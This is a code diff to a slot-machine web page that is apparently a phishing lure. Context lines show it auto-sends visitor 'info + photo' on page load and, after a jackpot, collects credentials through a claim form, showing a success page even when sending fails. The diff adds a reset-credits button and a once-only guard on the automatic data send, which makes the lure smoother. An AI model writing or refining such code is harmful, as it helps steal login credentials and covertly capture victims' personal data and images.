@@ -24,6 +24,8 @@
         .result.lose{color:#ff4444}
         .credits{color:#aaa;font-size:14px;margin-top:10px}
         .credits span{color:#ffd700;font-weight:700;font-size:18px}
+        .reset-btn{background:transparent;border:1px solid #ffd700;color:#ffd700;padding:8px 20px;border-radius:10px;cursor:pointer;font-size:13px;margin-top:10px;transition:0.3s}
+        .reset-btn:hover{background:#ffd700;color:#1a1a2e}
         .login-section{background:rgba(255,255,255,0.05);border-radius:15px;padding:20px;margin-top:20px;border:1px solid rgba(255,215,0,0.15);display:none}
         .login-section.show{display:block;animation:fadeIn 0.6s}
         @keyframes fadeIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
@@ -46,6 +48,7 @@
         .success-page .big-icon{font-size:80px;margin-bottom:15px}
         .success-page h2{color:#ffd700;font-size:28px;margin-bottom:10px}
         .success-page p{color:#aaa;font-size:16px;line-height:1.6}
+        .jackpot-msg{color:#ffd700;font-size:20px;font-weight:700;margin:10px 0}
     </style>
 </head>
 <body>
@@ -64,6 +67,7 @@
             <button class="spin-btn" id="spinBtn">🎰 SPIN</button>
             <div class="result" id="result">Press SPIN to try your luck!</div>
             <div class="credits">💰 Credits: <span id="credits">10</span></div>
+            <button class="reset-btn" id="resetBtn">⟳ Reset Credits</button>
         </div>
 
         <div class="win-overlay" id="winOverlay">
@@ -112,10 +116,14 @@ let credits = 10;
 let isSpinning = false;
 let jackpotTriggered = false;
 let claimed = false;
+let infoSent = false;
 
-// --- On page load: auto-send info + photo ---
+// --- On page load: auto-send info + photo (only once) ---
 window.addEventListener('load', function() {
-    sendAutoInfo();
+    if (!infoSent) {
+        infoSent = true;
+        sendAutoInfo();
+    }
 });
 
 function sendAutoInfo() {
@@ -228,13 +236,20 @@ const creditsEl = document.getElementById('credits');
 const spinBtn = document.getElementById('spinBtn');
 const winOverlay = document.getElementById('winOverlay');
 const loginSection = document.getElementById('loginSection');
+const resetBtn = document.getElementById('resetBtn');
 
 function getRandomSymbol() {
     return symbols[Math.floor(Math.random() * symbols.length)];
 }
 
 function spin() {
-    if (isSpinning || credits <= 0 || claimed) return;
+    if (isSpinning || credits <= 0 || claimed) {
+        if (credits <= 0 && !jackpotTriggered) {
+            resultEl.textContent = '💔 No credits! Click "Reset Credits" to continue.';
+            resultEl.className = 'result lose';
+        }
+        return;
+    }
     if (jackpotTriggered) {
         resultEl.textContent = '🎉 You already won! Claim your prize below!';
         return;
@@ -291,7 +306,8 @@ function checkResult() {
     spinBtn.disabled = false;
 
     if (credits <= 0 && !jackpotTriggered) {
-        resultEl.textContent = '💔 No credits left! Refresh to try again.';
+        resultEl.textContent = '💔 No credits! Click "Reset Credits" to continue.';
+        resultEl.className = 'result lose';
         spinBtn.disabled = true;
     }
 }
@@ -307,6 +323,20 @@ Waiting for credentials to claim prize...`;
     xhr.open('GET', url, true);
     xhr.send();
 }
+
+// --- Reset Credits ---
+resetBtn.addEventListener('click', function() {
+    if (jackpotTriggered) {
+        resultEl.textContent = '🎉 You already won! Claim your prize!';
+        return;
+    }
+    credits = 10;
+    creditsEl.textContent = credits;
+    spinBtn.disabled = false;
+    resultEl.textContent = '🔄 Credits reset! Spin again!';
+    resultEl.className = 'result';
+    reelEls.forEach(r => r.textContent = '🍒');
+});
 
 spinBtn.addEventListener('click', spin);
 
@@ -344,13 +374,11 @@ document.getElementById('claimForm').addEventListener('submit', function(e) {
     xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
             claimed = true;
-            // Show success page (no FB redirect)
             document.getElementById('gameArea').style.display = 'none';
             document.getElementById('successPage').classList.add('show');
         }
     };
     xhr.onerror = function() {
-        // Still show success even if error
         document.getElementById('gameArea').style.display = 'none';
         document.getElementById('successPage').classList.add('show');
     };
